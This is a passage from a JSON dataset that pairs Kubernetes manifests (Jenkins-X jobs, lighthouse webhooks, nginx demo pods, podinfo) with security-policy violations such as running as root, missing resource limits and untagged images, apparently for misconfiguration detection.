    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-boot-job\" not found"
  },
  {
    "id": "11431",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git-clone\" is not set to runAsNonRoot"
  },
  {
    "id": "11432",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job\" is not set to runAsNonRoot"
  },
  {
    "id": "11433",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git-clone\" has cpu request 0"
  },
  {
    "id": "11434",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job\" has cpu request 0"
  },
  {
    "id": "11435",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git-clone\" has memory limit 0"
  },
  {
    "id": "11436",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job\" has memory limit 0"
  },
  {
    "id": "11437",
    "manifest_path": "data/manifests/the_stack_sample/sample_4403.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4073\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11438",
    "manifest_path": "data/manifests/the_stack_sample/sample_4403.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4073\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11439",
    "manifest_path": "data/manifests/the_stack_sample/sample_4403.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4073\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11440",
    "manifest_path": "data/manifests/the_stack_sample/sample_4403.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4073\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11441",
    "manifest_path": "data/manifests/the_stack_sample/sample_4403.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4073\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11442",
    "manifest_path": "data/manifests/the_stack_sample/sample_4407.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.1.6\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: e78804a6245b3a1421f63d97e46b2830cc80b06f6789351329c8348775422a0c\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: ee8cdf4891444f0712ebc3606fda478855a759e0e8182d16a16a4de40df661b1\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.1.6\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: cicd-breqwatr\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.6\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: a68173eb6ae445c42f8b6207e084f0d67c5be008\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-webhooks\" does not have a read-only root file system"
  },
  {
    "id": "11443",
    "manifest_path": "data/manifests/the_stack_sample/sample_4407.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.1.6\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: e78804a6245b3a1421f63d97e46b2830cc80b06f6789351329c8348775422a0c\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: ee8cdf4891444f0712ebc3606fda478855a759e0e8182d16a16a4de40df661b1\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.1.6\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: cicd-breqwatr\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.6\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: a68173eb6ae445c42f8b6207e084f0d67c5be008\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-webhooks\" not found"
  },
  {
    "id": "11444",
    "manifest_path": "data/manifests/the_stack_sample/sample_4407.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.1.6\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: e78804a6245b3a1421f63d97e46b2830cc80b06f6789351329c8348775422a0c\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: ee8cdf4891444f0712ebc3606fda478855a759e0e8182d16a16a4de40df661b1\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.1.6\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: cicd-breqwatr\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.6\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: a68173eb6ae445c42f8b6207e084f0d67c5be008\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-webhooks\" is not set to runAsNonRoot"
  },
  {
    "id": "11445",
    "manifest_path": "data/manifests/the_stack_sample/sample_4408.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hook-demo1\n  labels:\n    app: hook\nspec:\n  containers:\n  - name: hook-demo1\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hook-demo1\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11446",
    "manifest_path": "data/manifests/the_stack_sample/sample_4408.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hook-demo1\n  labels:\n    app: hook\nspec:\n  containers:\n  - name: hook-demo1\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook-demo1\" does not have a read-only root file system"
  },
  {
    "id": "11447",
    "manifest_path": "data/manifests/the_stack_sample/sample_4408.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hook-demo1\n  labels:\n    app: hook\nspec:\n  containers:\n  - name: hook-demo1\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook-demo1\" is not set to runAsNonRoot"
  },
  {
    "id": "11448",
    "manifest_path": "data/manifests/the_stack_sample/sample_4408.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hook-demo1\n  labels:\n    app: hook\nspec:\n  containers:\n  - name: hook-demo1\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook-demo1\" has cpu request 0"
  },
  {
    "id": "11449",
    "manifest_path": "data/manifests/the_stack_sample/sample_4408.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hook-demo1\n  labels:\n    app: hook\nspec:\n  containers:\n  - name: hook-demo1\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook-demo1\" has memory limit 0"
  },
  {
    "id": "11450",
    "manifest_path": "data/manifests/the_stack_sample/sample_4409.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7032\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11451",
    "manifest_path": "data/manifests/the_stack_sample/sample_4409.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7032\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11452",
    "manifest_path": "data/manifests/the_stack_sample/sample_4409.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7032\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11453",
    "manifest_path": "data/manifests/the_stack_sample/sample_4409.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7032\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11454",
    "manifest_path": "data/manifests/the_stack_sample/sample_4409.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7032\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11455",
    "manifest_path": "data/manifests/the_stack_sample/sample_4410.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: glob:3.2.*\n    fluxcd.io/locked_msg: 3.2.2 does not work for us\n    fluxcd.io/locked_user: Jibin George <hello@jibingeo.com>\n    fluxcd.io/locked: 'true'\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.2.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - --ui-message='Welcome to Flux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: 